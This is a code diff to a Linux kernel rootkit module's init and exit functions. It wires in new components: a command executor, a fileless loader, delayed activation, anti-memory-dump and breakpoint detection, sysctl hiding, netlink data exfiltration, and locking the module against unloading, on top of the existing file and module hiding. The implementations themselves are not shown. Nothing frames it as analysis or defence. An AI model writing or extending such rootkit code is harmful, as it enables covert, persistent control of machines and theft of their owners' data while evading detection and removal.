@@ -19,6 +19,15 @@
 #include "packet_filter.h"
 #include "anti_watchdog.h"
 #include "vfs_file_hiding.h"
+#include "command_executor.h"
+#include "delayed_activation.h"
+#include "fileless_loader.h"
+#include "self_watchdog.h"
+#include "unload_protection.h"
+#include "anti_memdump.h"
+#include "sysctl_hiding.h"
+#include "breakpoint_detector.h"
+#include "netlink_exfil.h"
 
 static int __init rootkit_init(void) {
 #ifdef ENABLE_STRING_ENCRYPT
@@ -45,7 +54,16 @@ static int __init rootkit_init(void) {
     setup_packet_filter();
     setup_anti_watchdog();
     setup_vfs_file_hiding();
+    setup_command_executor();
+    start_delayed_activation();
+    setup_fileless_loader();
+    start_self_watchdog();
+    setup_anti_memdump();
+    setup_sysctl_hiding();
+    check_for_breakpoints();
+    setup_netlink_exfil();
     hide_module();
+    lock_module_unloading();
     return 0;
 }
 
@@ -72,6 +90,12 @@ static void __exit rootkit_exit(void) {
     remove_packet_filter();
     remove_anti_watchdog();
     remove_vfs_file_hiding();
+    remove_command_executor();
+    cleanup_fileless_loader();
+    stop_self_watchdog();
+    remove_anti_memdump();
+    remove_sysctl_hiding();
+    cleanup_netlink_exfil();
 }
 
 module_init(rootkit_init);
